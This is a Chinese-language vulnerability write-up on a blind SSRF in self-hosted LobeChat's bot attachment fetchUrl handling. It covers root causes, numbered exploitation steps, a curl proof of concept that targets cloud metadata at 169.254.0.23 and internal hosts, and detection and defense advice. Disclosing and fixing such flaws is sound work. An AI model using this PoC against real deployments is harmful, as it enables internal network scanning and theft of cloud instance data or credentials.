---
id: web-generic-ssrf-lobechat-botmessage-attachment-fetchurl
title: LobeChat botMessage 附件 fetchUrl 裸 fetch：任意注册用户经四个 bot 平台发起盲 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: bot-attachment-fetchurl-ssrf
tags:
- lobechat
- ssrf
- bot
- discord
- slack
- wechat
- feishu
- fetchurl
- blind-ssrf
- cloud-metadata
- oss
cve: []
severity: high
confidence: high
affected_versions: v2.2.9 至 v2.2.14-canary.74（原文实测 v2.2.13；原文明确 2026-08-12 发布的 v2.2.14-canary.74 仍受影响）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V68
  verified_at: '2026-11-05T11:55:07+08:00'
  notes: 已对照原文与13张内嵌截图核对：图01 grep 确认 discord/sendAttachments.ts:33 裸 fetch(attachment.fetchUrl)；图02 docker ps；图03 KEY_VAULTS_SECRET 报错；图04 伪造 Discord 凭据创建 bot 成功（botId 77a0bac4...）；图05 sendMessage 返回 HTTP500 Connect Timeout discord.com:443 且提示 attachment downloaded；图06 宿主机 9999 收到 172.25.0.5 GET；图07/10 DEBUG 日志 files=1/0；图08 audit scan；图09 容器直连腾讯云 169.254.0.23 得到 ins-2axv5mea；图11/12/13 audit 输出 4 处高置信盲区+92 处待复核。入口 schema、OSS RBAC no-op、botToken 三段式格式校验、AgentBotProvider ownership、盲 SSRF 观测方式与原文一致。affected_versions 按原文 v2.2.9 至 v2.2.14-canary.74 标记。未验证点：实测为盲 SSRF，metadata 内容未直接回流；使用真实 bot 凭据获得回显属代码路径推断；PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-lobechat-botmessage-attachment-fetchurl/
draft: false
kb_aliases:
- LobeChat SSRF
- botMessage 附件 SSRF
- fetchUrl 裸 fetch
- LobeChat 第五个洞
- Discord/Slack/微信/飞书 bot 附件 SSRF
- LobeChat 盲 SSRF
---

## 一句话结论

LobeChat 的 `botMessage.sendMessage` / `sendDirectMessage` 接受附件对象里的 `fetchUrl`，Discord、Slack、微信、飞书四个平台的 `sendAttachments.ts` 都用裸 `fetch(attachment.fetchUrl)` 下载附件，没有套项目自带的 `ssrfSafeFetch`；在 OSS 自部署（server-database 模式）里，任意注册用户可创建 agent、用伪造的 bot 凭据创建自己的 bot，再调 sendMessage，让服务器向任意内网地址或云 metadata 发起请求（盲 SSRF）。

## 原理

- **入口**：tRPC 接口 `botMessage.sendMessage` / `sendDirectMessage` 的 `attachments` 输入 schema 中，`fetchUrl` 只经过 `z.string().url()` 校验，只验证 URL 格式合法，不限制协议、主机或私网地址；`http://169.254.0.23/latest/meta-data/instance-id`、`http://172.25.0.1:9999/` 都能通过。
- **出口**：四个平台的 `sendAttachments.ts` 中 `loadAttachmentBuffer` 优先用 base64 `data`，否则直接 `fetch(attachment.fetchUrl, { signal: AbortSignal.timeout(15_000) })`，拿到 `arrayBuffer()` 后作为附件上传到对应平台。该路径没有调用 `ssrfSafeFetch`，因此私网、链路本地、云 metadata 地址全部放行。
- **为什么普通用户能调到**：OSS 版的 `packages/business-server/src/trpc-middlewares/rbacPermission.ts` 是 no-op stub，`withScopedPermission`、`withRbacPermission` 等中间件全部直接 `opts.next()`；`src/business/server/bot/featureAccess.ts` 的 `isBotFeatureAccessAllowed` 恒返回 true。云端版通过 tsconfig 路径优先级替换为真实 RBAC 实现，自部署 OSS 版只命中 stub。
- **为什么能用自己的 bot 干坏事**：`AgentBotProviderModel.findById` 的 `ownership()` 只保证不能用别人的 bot；攻击者注册后创建自己的 agent 与 bot，归属校验自然通过。
- **为什么伪造凭据能过**：创建 bot 时 Discord 的 `botToken` 只做三段式格式校验（`^[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,}$`），不调用平台 API 验证真伪；applicationId、publicKey 也只校验格式。因此注册账号后三个请求即可拿到可用 botId。
- **为什么是盲 SSRF**：`loadAttachmentBuffer` 的 fetch 失败被 try/catch 静默吞掉并返回 undefined，随后仍走平台上传流程；由于 bot token 是伪造的，最终 tRPC 响应永远是连接 discord.com 超时，开放端口与关闭端口的响应没有差异。可达性只能靠外部观测：攻击者控制的内网 HTTP 服务日志，或服务器 `DEBUG=bot-platform:*` 日志中的 `files=1`（下载成功）/`files=0`（下载失败）。
- **为什么危害成立**：服务器用容器网络发起请求，可打内网任意 IP:端口、Docker 网络内其他容器、以及云 metadata（腾讯云 `169.254.0.23` 实测可读取 instance-id）。metadata 若绑定云角色还可能包含临时凭证；本文实测只到 instance-id 层面。

## 触发条件

- 目标为 OSS 自部署且使用 server-database 模式（多用户、可注册），注册不要求邮箱验证。
- 目标版本在 v2.2.9 至 v2.2.14-canary.74 区间（四个平台 sendAttachments 均为裸 fetch）。
- 攻击者能注册账号并创建 agent、bot（bot 凭据只需满足格式校验）。
- 服务器可访问目标地址（内网、Docker 网络、云 metadata），且没有在出口层阻断私网/链路本地。
- 盲打判定需要外部观测点（攻击者控制的内网 HTTP 服务或目标 debug 日志）。

## 利用步骤

1. 注册普通账号，拿到 session cookie（无需邮箱验证）。
2. 调 `agent.createAgent` 创建一个 agent，得到 agentId。
3. 调 `agentBotProvider.create`，platform 选 discord（或 slack/wechat/feishu），填入满足格式的伪造 applicationId、publicKey、botToken，得到 botId。
4. 调 `botMessage.sendMessage`，传自己的 botId、任意 channelId、content，以及 `attachments[].fetchUrl` 指向目标地址。
5. 服务器在 `loadAttachmentBuffer` 中裸 fetch 该地址；tRPC 响应因假 token 上传失败而报 discord 连接超时，无法从响应判断结果。
6. 通过外部观测确认：内网 HTTP 服务日志出现来自 LobeChat 容器的请求；或查看 `DEBUG=bot-platform:*` 日志，`files=1` 表示目标可达且内容已下载，`files=0` 表示不可达。
7. 遍历 `IP:端口` 即可做内网端口扫描；把 fetchUrl 换成云 metadata 端点即可读取实例信息（盲打时内容不直接回流，但字节确实被服务器取回并进入上传流程）。

## PoC

```bash
# 1) 注册普通账号
curl -X POST http://target:3210/api/auth/sign-up/email \
  -H 'Content-Type: application/json' \
  -d '{"name":"u","email":"u@test.com","password":"Test@123456"}'

# 2) 创建 agent
curl -X POST http://target:3210/trpc/lambda/agent.createAgent \
  -H 'Cookie: better-auth.session_token=<session>' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"title":"a"}}'

# 3) 创建 bot（伪造 Discord 凭据，只过格式校验）
curl -X POST http://target:3210/trpc/lambda/agentBotProvider.create \
  -H 'Cookie: better-auth.session_token=<session>' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"agentId":"<agent_id>","applicationId":"222333444555666777","platform":"discord","credentials":{"publicKey":"<64位hex>","botToken":"<三段式格式token>"}}}'

# 4) 触发 SSRF：fetchUrl 指向内网或云 metadata
curl -X POST http://target:3210/trpc/lambda/botMessage.sendMessage \
  -H 'Cookie: better-auth.session_token=<session>' \
  -H 'Content-Type: application/json' \
  -d '{"json":{"botId":"<bot_id>","channelId":"111111111111111111","content":"t","attachments":[{"type":"file","name":"m.txt","mimeType":"text/plain","fetchUrl":"http://169.254.0.23/latest/meta-data/instance-id"}]}}'

# 5) 观测（盲打）
docker logs lobechat-app 2>&1 | grep -E 'materializeAttachmentsForDiscord|createMessage'
# files=1 可达且已下载；files=0 下载失败/不可达
```

## 变体与关联

- 变体：四个平台（Discord/Slack/微信/飞书）实现相同，任选其一即可；不同平台的上传失败表现不同，但 fetch 阶段都已发生。
- 变体：Telegram 是“转发型”——`resolveTelegramSource` 把 fetchUrl 原样透传给 Telegram API，由 Telegram 服务器拉取，不构成 LobeChat 服务器 SSRF；审计时必须区分代理型（服务器自己 fetch）与转发型（第三方 fetch）。
- 变体：盲打可做内网端口扫描与 Docker 网络横向（LobeChat 容器所在 172.x 网段可能还有数据库、缓存、其他业务容器）。
- 变体：若攻击者使用自己真实有效的 bot token 和可控频道，下载到的附件会被上传到该频道，盲打可变为有回显；这是基于代码路径的推断，原文用假 token 未实测。
- 关联：[[web-generic-ssrf-cloud-metadata]]（云 metadata SSRF 通用手法）；[[cloud-metadata-ssrf-imdsv2-token-credential]]（AWS IMDSv2 凭证读取）。
- 关联：CVE-2026-59095 是 LobeChat 已公开的 SSRF，官方只修复了 `agentSkills.importFromUrl` 与生成图片的 `fetchImageFromUrl` 两个端点；本条是同一类 sink 在 bot 附件路径上的遗漏，属于修复覆盖不全，不是 CVE-2026-59095 本身。
- 边界：cloud 托管版使用真实 RBAC，是否可利用取决于云端权限模型；单用户本地模式没有多用户注册攻击面；若四个 sendAttachments 已改用 ssrfSafeFetch 或出口阻断私网/metadata，则本手法不成立。

## 检测与防御

- 检测：审计 `botMessage.sendMessage` / `sendDirectMessage` 的 `attachments[].fetchUrl`，关注指向私网、链路本地、云 metadata 或非常规端口的请求；关注新注册账号短时间内创建 agent + bot 并调用 sendMessage 的行为。
- 检测：开启 `DEBUG=bot-platform:*`，监控 `materializeAttachmentsForDiscord: skipping attachment`（files=0）与 `createMessage: files=1` 的异常分布；在出口侧记录应用容器发往 169.254.0.0/16、10/8、172.16/12、192.168/16 的请求。
- 防御：四个平台的 `sendAttachments.ts` 统一改用 `ssrfSafeFetch`；把“服务端 fetch 用户可控 URL”收敛到统一封装，禁止裸 `fetch`。
- 防御：创建 bot 时调用平台 API 验证 token 真伪，把攻击门槛从“注册账号”提高到“拥有真实 bot 应用”。
- 防御：对 `fetchUrl` 做协议与目标白名单校验，拒绝私网/链路本地/云 metadata 地址；在网络层限制容器出站到 metadata。
- 加固：把“新增 fetch 调用点是否套防护、URL 是否来自用户输入”做成 CI/lint 检查，避免按调用点打补丁后再次遗漏同类 sink。
